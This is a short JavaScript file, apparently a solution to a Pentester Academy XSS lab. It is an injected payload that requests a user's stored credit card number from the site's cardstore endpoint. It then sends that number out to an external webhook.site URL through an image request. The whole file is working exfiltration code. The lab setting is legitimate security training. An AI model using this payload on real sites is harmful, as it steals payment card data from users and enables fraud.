// https://pentesteracademylab.appspot.com/lab/webapp/jfp/15

// Objectives:
//     Find John's Credit Card Number using an XSS vulnerability on this page
//     Post the Credit Card Number to your Attacker Server


const http = new XMLHttpRequest();
const url = '/lab/webapp/jfp/15/cardstore'; 
http.open('POST', url);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.send('user=john')

http.onreadystatechange = function (){
    if (this.readyState == 4 && this.status == 200){
        const img = new Image().src = 'https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57/?ccn='+http.responseText;
    }
}